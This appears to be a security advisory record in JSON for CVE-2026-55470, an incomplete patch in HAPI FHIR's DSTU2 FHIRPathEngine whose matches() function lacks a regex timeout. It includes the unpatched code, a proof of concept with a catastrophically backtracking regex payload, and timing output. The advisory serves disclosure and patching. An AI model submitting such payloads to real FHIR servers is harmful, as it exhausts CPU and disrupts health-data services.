@@ -1,0 +1,50 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-06-17T18:47:23Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "ca.uhn.hapi.fhir:org.hl7.fhir.dstu2"
+  },
+  "Advisory": {
+    "DatabaseId": 364744,
+    "Id": "GSA_kwCzR0hTQS1meGo0LXA5eHAtMzd2Nc4ABZDI",
+    "GhsaId": "GHSA-fxj4-p9xp-37v5",
+    "References": [
+      {
+        "Url": "https://github.com/hapifhir/org.hl7.fhir.core/security/advisories/GHSA-fxj4-p9xp-37v5"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-fxj4-p9xp-37v5"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-fxj4-p9xp-37v5"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-55470"
+      }
+    ],
+    "Description": "## Summary\nThe fix for CVE-2026-45367 added `RegexTimeout` protection to the `matches()` function in DSTU2016MAY, DSTU3, R4, R4B, and R5, but the DSTU2 module was incompletely patched. In `org.hl7.fhir.dstu2`, `replaceMatches()` was updated while `matches()` at line 2462 still calls the raw `String.matches(sw)` without any timeout, allowing an unauthenticated attacker to trigger catastrophic regex backtracking and exhaust server CPU.\n\n\n## Details\n### Incomplete patch\n\nWithin the same file\n(`org.hl7.fhir.dstu2/utils/FHIRPathEngine.java`), the two functions were\npatched inconsistently:\n\n**Line 2226 — replaceMatches() — PATCHED:**\n```java\nresult.add(new StringType(\n    RegexTimeout.replaceAll(\n        convertToString(focus.get(0)), regex, repl, regexTimeoutMillis)));\n```\n\n**Line 2462 — matches() — NOT PATCHED:**\n```java\nresult.add(new BooleanType(\n    convertToString(focus.get(0)).matches(sw)));\n// ↑ raw String.matches() — no RegexTimeout, no complexity check\n```\n\n**DSTU3 line 2447 — matches() — PATCHED (for comparison):**\n```java\nresult.add(new BooleanType(\n    RegexTimeout.matches(st, sw, regexTimeoutMillis)));\n```\n\n### Module-by-module status\n\n| Module | `matches()` | `replaceMatches()` |\n|---|---|---|\n| **DSTU2** | ❌ raw `str.matches(sw)` | ✅ `RegexTimeout.replaceAll()` |\n| DSTU2016MAY | ✅ `RegexTimeout.matches()` | ✅ |\n| DSTU3 | ✅ `RegexTimeout.matches()` | ✅ |\n| R4 | ✅ `RegexTimeout.matches()` | ✅ |\n| R4B | ✅ `RegexTimeout.matches()` | ✅ |\n| R5 | ✅ `RegexTimeout.matches()` | ✅ |\n\n\n## PoC\n**Requirements:** Java 17+, Maven 3.8+\n\n**pom.xml dependencies:**\n```xml\n\u003cdependency\u003e\n    \u003cgroupId\u003eca.uhn.hapi.fhir\u003c/groupId\u003e\n    \u003cartifactId\u003eorg.hl7.fhir.utilities\u003c/artifactId\u003e\n    \u003cversion\u003e6.9.7\u003c/version\u003e\n\u003c/dependency\u003e\n```\n\n**Test code (reproduces the exact behaviour of DSTU2 line 2462):**\n```java\nimport org.hl7.fhir.utilities.regex.RegexTimeout;\nimport java.util.concurrent.*;\n\nString regex = \"((a|b){0,5}){20}\";\nString input = \"a\".repeat(25) + \"c\";    // no match → full backtracking\n\n// ① Patched approach — RegexTimeout terminates at 500 ms\nlong t1 = System.currentTimeMillis();\ntry {\n    RegexTimeout.matches(input, regex, 500);\n} catch (TimeoutException e) {\n    System.out.println(\"RegexTimeout blocked in \" +\n        (System.currentTimeMillis() - t1) + \" ms\");\n}\n\n// ② DSTU2 line 2462 — raw String.matches(), no timeout\nlong t2 = System.currentTimeMillis();\ninput.matches(regex);                   // equivalent to what FHIRPathEngine does\nSystem.out.println(\"str.matches() ran for \" +\n    (System.currentTimeMillis() - t2) + \" ms with no timeout\");\n```\n\n**Verified output (JDK 25.0.3, Linux):**\n```\nRegexTimeout blocked in 508 ms      ← patched modules: attack stopped\nstr.matches() ran for 1410 ms       ← DSTU2: no timeout, CPU exhausted\n```\n\nThe patched approach cuts off the evaluation at 508 ms. The unpatched DSTU2\ncode runs for 1410 ms on this input with no mechanism to stop it. Longer\ninputs or more complex patterns produce proportionally worse results.\n\n\n## Impact\n**Vulnerability type:** Regular Expression Denial of Service (ReDoS) causing CPU exhaustion and service disruption.\n\n**Who is impacted:** Any application using the `ca.uhn.hapi.fhir:org.hl7.fhir.dstu2` module that evaluates user-supplied FHIRPath expressions — including the FHIR Validator HTTP endpoint, FHIR servers applying FHIRPath invariants from user-provided resources or profiles, and any system embedding `FHIRPathEngine` from the DSTU2 module. No authentication is required; an attacker needs only to submit a FHIR resource or FHIRPath expression whose `matches()` argument contains a catastrophically backtracking regular expression.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-06-17T18:47:23Z",
+    "Severity": "HIGH",
+    "Summary": "HAPI FHIR: Incomplete fix for CVE-2026-45367: DSTU2 FHIRPathEngine.matches() missing RegexTimeout protection allows ReDoS",
+    "UpdatedAt": "2026-06-17T18:47:23Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 7.5,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "6.9.10"
+      },
+      "VulnerableVersionRange": "\u003c= 6.9.9"
+    }
+  ]
+}
